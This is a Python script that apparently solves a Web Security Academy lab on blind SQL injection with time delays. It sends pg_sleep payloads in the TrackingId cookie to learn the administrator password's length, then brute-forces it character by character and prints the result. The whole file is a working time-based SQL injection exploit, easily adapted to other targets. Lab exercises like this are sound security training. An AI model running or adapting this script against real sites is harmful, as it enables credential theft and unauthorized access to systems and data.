# Lab: Blind SQL injection with time delays and information retrieval

import requests
import re
import sys
import bs4
from requests.utils import requote_uri
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

target_url = "https://0a0900c804ebb4b4c08a36c5003000fc.web-security-academy.net"

r = requests.Session()
proxies = {
    'https':'http://127.0.0.1:8080',
    'http':'http://127.0.0.1:8080'
}

def sql_find_password_len(url, tracking_id, session_id):
    url = url
    print("[+] Finding Password Length")
    for password_length in range(1,100):
        payload = tracking_id + "'%3bSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=" + str(password_length) + ")+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
        headers = {
            'Cookie': payload + "; " + session_id,
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
        }

        out = r.get(url, headers = headers, proxies = proxies, verify = False)
        response_time = out.elapsed.total_seconds()
        print("\t[*] Tried Password Length: {}\t Response time: {}".format(str(password_length),str(response_time)))
        if response_time > 5:
            print("[+] Found Password Length", str(password_length))
            return password_length

def sql_injection(tracking_id, session_id):

    url = target_url + "/filter?category=Lifestyle"

    password_len = sql_find_password_len(url, tracking_id, session_id)

    # creates the list of alpha numbers to brute force
    alpha_numbers = []
    for i in range(97, 123):
        alpha_numbers.append(chr(i))
    for i in range(48,58):
        alpha_numbers.append(chr(i))

    # brute to find password
    password = []
    print("[+] Finding Password")
    for index in range(1,password_len+1):

        for character in alpha_numbers:
            payload = tracking_id + "'%3bSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password," + str(index) + ",1)='" + character + "')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
            headers = {
                'Cookie': payload + "; " + session_id,
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
            }
            
            out = r.get(url, headers = headers, proxies = proxies, verify = False)
            response_time = out.elapsed.total_seconds()
            if response_time > 5:
                print("\t[*] Found {} Character: {}\tResponse time: {}".format(index, character, response_time))
                password.append(character)
    
    print("[+] Exploited. The administrator password is: ", "".join(password))

def get_tracking_id():
    url = target_url

    out = r.get(url, proxies = proxies, verify = False)
    if out.status_code == 200:
        cookies = out.headers['Set-Cookie'].split(",")
        tracking_id = (cookies[0]).split(";")[0]
        session_id = (cookies[1]).split(";")[0]
        return tracking_id, session_id
    else:
        print("[+] Error getting tracking id and session id")
        sys.exit(0)
    
tracking_id, session_id = get_tracking_id()
sql_injection(tracking_id, session_id)